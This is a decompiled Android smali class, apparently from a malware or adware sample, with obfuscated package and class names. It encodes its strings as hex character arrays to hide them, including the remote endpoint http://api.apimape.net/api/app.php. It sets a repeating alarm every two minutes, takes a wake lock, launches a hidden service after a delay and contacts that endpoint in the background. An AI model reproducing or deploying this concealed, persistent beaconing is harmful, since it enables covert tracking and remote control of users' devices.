.class public Lkosp/ynqekv/swdt/Xnlyhjvxo;
.super Landroid/content/BroadcastReceiver;
.source "Xnlyhjvxo.java"


# static fields
.field public static final ONE_TIME:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 26
    new-instance v0, Ljava/lang/String;

    const/4 v1, 0x7

    new-array v1, v1, [C

    fill-array-data v1, :array_0

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([C)V

    sput-object v0, Lkosp/ynqekv/swdt/Xnlyhjvxo;->ONE_TIME:Ljava/lang/String;

    return-void

    :array_0
    .array-data 2
        0x6fs
        0x6es
        0x65s
        0x74s
        0x69s
        0x6ds
        0x65s
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 24
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public CancelAlarm(Landroid/content/Context;)V
    .locals 5
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    const/4 v4, 0x0

    .line 77
    new-instance v1, Landroid/content/Intent;

    const-class v3, Lkosp/ynqekv/swdt/Xnlyhjvxo;

    invoke-direct {v1, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 78
    .local v1, "intent":Landroid/content/Intent;
    invoke-static {p1, v4, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 79
    .local v2, "sender":Landroid/app/PendingIntent;
    const-string v3, "alarm"

    invoke-virtual {p1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 80
    .local v0, "alarmManager":Landroid/app/AlarmManager;
    invoke-virtual {v0, v2}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 81
    return-void
.end method

.method public SetAlarm(Landroid/content/Context;)V
    .locals 12
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    const/4 v1, 0x0

    .line 59
    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v10

    .line 60
    .local v10, "pm":Landroid/content/pm/PackageManager;
    const/16 v2, 0x6f2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    .line 62
    .local v11, "value":Ljava/lang/Integer;
    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0x80

    invoke-virtual {v10, v2, v3}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v7

    .line 63
    .local v7, "ai":Landroid/content/pm/ApplicationInfo;
    iget-object v2, v7, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    new-instance v3, Ljava/lang/String;

    const/16 v4, 0x8

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v11

    .line 67
    .end local v7    # "ai":Landroid/content/pm/ApplicationInfo;
    :goto_0
    const-string v2, "alarm"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 68
    .local v0, "am":Landroid/app/AlarmManager;
    new-instance v9, Landroid/content/Intent;

    const-class v2, Lkosp/ynqekv/swdt/Xnlyhjvxo;

    invoke-direct {v9, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 69
    .local v9, "intent":Landroid/content/Intent;
    sget-object v2, Lkosp/ynqekv/swdt/Xnlyhjvxo;->ONE_TIME:Ljava/lang/String;

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-virtual {v9, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    .line 70
    invoke-static {p1, v1, v9, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 72
    .local v6, "pi":Landroid/app/PendingIntent;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/32 v4, 0x1d4c0

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 73
    return-void

    .line 64
    .end local v0    # "am":Landroid/app/AlarmManager;
    .end local v6    # "pi":Landroid/app/PendingIntent;
    .end local v9    # "intent":Landroid/content/Intent;
    :catch_0
    move-exception v8

    .line 65
    .local v8, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x5

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    new-instance v3, Ljava/lang/String;

    const/16 v4, 0x1b

    new-array v4, v4, [C

    fill-array-data v4, :array_2

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 63
    :array_0
    .array-data 2
        0x64s
        0x65s
        0x66s
        0x74s
        0x69s
        0x6ds
        0x65s
        0x72s
    .end array-data

    .line 65
    :array_1
    .array-data 2
        0x73s
        0x75s
        0x67s
        0x61s
        0x72s
    .end array-data

    nop

    :array_2
    .array-data 2
        0x43s
        0x6fs
        0x75s
        0x6cs
        0x64s
        0x6es
        0x27s
        0x74s
        0x20s
        0x66s
        0x69s
        0x6es
        0x64s
        0x20s
        0x63s
        0x6fs
        0x6es
        0x66s
        0x69s
        0x67s
        0x20s
        0x76s
        0x61s
        0x6cs
        0x75s
        0x65s
        0x20s
    .end array-data
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 14
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 30
    const-string v9, "power"

    invoke-virtual {p1, v9}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/os/PowerManager;

    .line 31
    .local v2, "pm":Landroid/os/PowerManager;
    const/4 v9, 0x1

    new-instance v10, Ljava/lang/String;

    const/16 v11, 0x8

    new-array v11, v11, [C

    fill-array-data v11, :array_0

    invoke-direct {v10, v11}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v2, v9, v10}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    .line 33
    .local v8, "wl":Landroid/os/PowerManager$WakeLock;
    invoke-virtual {v8}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 34
    new-instance v9, Ljava/lang/String;

    const/4 v10, 0x5

    new-array v10, v10, [C

    fill-array-data v10, :array_1

    invoke-direct {v9, v10}, Ljava/lang/String;-><init>([C)V

    const/4 v10, 0x0

    invoke-virtual {p1, v9, v10}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 35
    .local v3, "settings3":Landroid/content/SharedPreferences;
    new-instance v9, Ljava/lang/String;

    const/4 v10, 0x5

    new-array v10, v10, [C

    fill-array-data v10, :array_2

    invoke-direct {v9, v10}, Ljava/lang/String;-><init>([C)V

    const/4 v10, 0x0

    invoke-interface {v3, v9, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v4

    .line 36
    .local v4, "start":I
    new-instance v9, Ljava/lang/String;

    const/16 v10, 0x9

    new-array v10, v10, [C

    fill-array-data v10, :array_3

    invoke-direct {v9, v10}, Ljava/lang/String;-><init>([C)V

    const-wide/16 v10, 0x0

    invoke-interface {v3, v9, v10, v11}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v9

    invoke-static {v9, v10}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v5

    .line 37
    .local v5, "starttime":Ljava/lang/Long;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    const-wide/16 v11, 0x3e8

    div-long/2addr v9, v11

    invoke-static {v9, v10}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v6

    .line 38
    .local v6, "tsLong":Ljava/lang/Long;
    const/4 v9, 0x1

    if-ne v4, v9, :cond_0

    invoke-virtual {v5}, Ljava/lang/Long;->longValue()J

    move-result-wide v9

    const-wide/16 v11, 0x1e

    add-long/2addr v9, v11

    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J

    move-result-wide v11

    cmp-long v9, v9, v11

    if-gez v9, :cond_0

    .line 39
    new-instance v9, Landroid/content/Intent;

    const-class v10, Lkosp/ynqekv/swdt/Fxjmcxqw;

    invoke-direct {v9, p1, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v9}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 41
    new-instance v9, Ljava/lang/String;

    const/4 v10, 0x5

    new-array v10, v10, [C

    fill-array-data v10, :array_4

    invoke-direct {v9, v10}, Ljava/lang/String;-><init>([C)V

    const/4 v10, 0x0

    invoke-virtual {p1, v9, v10}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 42
    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 43
    .local v1, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v9, Ljava/lang/String;

    const/4 v10, 0x5

    new-array v10, v10, [C

    fill-array-data v10, :array_5

    invoke-direct {v9, v10}, Ljava/lang/String;-><init>([C)V

    const/4 v10, 0x2

    invoke-interface {v1, v9, v10}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 44
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 48
    .end local v1    # "editor":Landroid/content/SharedPreferences$Editor;
    :cond_0
    new-instance v7, Ljava/lang/String;

    const/4 v9, 0x5

    new-array v9, v9, [C

    fill-array-data v9, :array_6

    invoke-direct {v7, v9}, Ljava/lang/String;-><init>([C)V

    .line 49
    .local v7, "type":Ljava/lang/String;
    const-string v0, ""

    .line 50
    .local v0, "data":Ljava/lang/String;
    new-instance v9, Lkosp/ynqekv/swdt/Kadba;

    invoke-direct {v9, p1}, Lkosp/ynqekv/swdt/Kadba;-><init>(Landroid/content/Context;)V

    const/4 v10, 0x3

    new-array v10, v10, [Ljava/lang/String;

    const/4 v11, 0x0

    new-instance v12, Ljava/lang/String;

    const/16 v13, 0x22

    new-array v13, v13, [C

    fill-array-data v13, :array_7

    invoke-direct {v12, v13}, Ljava/lang/String;-><init>([C)V

    aput-object v12, v10, v11

    const/4 v11, 0x1

    aput-object v7, v10, v11

    const/4 v11, 0x2

    aput-object v0, v10, v11

    invoke-virtual {v9, v10}, Lkosp/ynqekv/swdt/Kadba;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 54
    invoke-virtual {v8}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 55
    return-void

    .line 31
    :array_0
    .array-data 2
        0x59s
        0x4fs
        0x55s
        0x52s
        0x20s
        0x54s
        0x41s
        0x47s
    .end array-data

    .line 34
    :array_1
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 35
    nop

    :array_2
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x72s
        0x74s
    .end array-data

    .line 36
    nop

    :array_3
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x72s
        0x74s
        0x74s
        0x69s
        0x6ds
        0x65s
    .end array-data

    .line 41
    nop

    :array_4
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 43
    nop

    :array_5
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x72s
        0x74s
    .end array-data

    .line 48
    nop

    :array_6
    .array-data 2
        0x74s
        0x69s
        0x6ds
        0x65s
        0x72s
    .end array-data

    .line 50
    nop

    :array_7
    .array-data 2
        0x68s
        0x74s
        0x74s
        0x70s
        0x3as
        0x2fs
        0x2fs
        0x61s
        0x70s
        0x69s
        0x2es
        0x61s
        0x70s
        0x69s
        0x6ds
        0x61s
        0x70s
        0x65s
        0x2es
        0x6es
        0x65s
        0x74s
        0x2fs
        0x61s
        0x70s
        0x69s
        0x2fs
        0x61s
        0x70s
        0x70s
        0x2es
        0x70s
        0x68s
        0x70s
    .end array-data
.end method

.method public setOnetimeTimer(Landroid/content/Context;)V
    .locals 6
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    const/4 v5, 0x0

    .line 84
    const-string v3, "alarm"

    invoke-virtual {p1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 85
    .local v0, "am":Landroid/app/AlarmManager;
    new-instance v1, Landroid/content/Intent;

    const-class v3, Lkosp/ynqekv/swdt/Xnlyhjvxo;

    invoke-direct {v1, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 86
    .local v1, "intent":Landroid/content/Intent;
    sget-object v3, Lkosp/ynqekv/swdt/Xnlyhjvxo;->ONE_TIME:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-virtual {v1, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    .line 87
    invoke-static {p1, v5, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 88
    .local v2, "pi":Landroid/app/PendingIntent;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-virtual {v0, v5, v3, v4, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 89
    return-void
.end method
